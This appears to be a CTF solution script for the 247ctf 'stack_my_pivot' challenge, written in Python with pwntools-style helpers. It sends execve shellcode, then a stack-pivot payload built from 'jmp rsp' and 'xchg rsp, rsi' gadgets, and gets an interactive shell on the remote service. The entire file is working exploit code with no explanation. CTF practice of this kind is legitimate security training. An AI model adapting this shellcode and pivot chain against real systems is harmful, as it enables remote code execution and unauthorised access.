#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./stack_my_pivot')
host = args.HOST or 'be5719d3c7751070.247ctf.com'
port = int(args.PORT or 50142)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

re()
sl(asm(execve_x64))
re()
sl( p(0xdeadbeef) + gadget("jmp rsp") + asm('sub rsp, 0x50; jmp rsp').ljust(8, b'\x90') + gadget("xchg rsp, rsi"))

io.interactive()
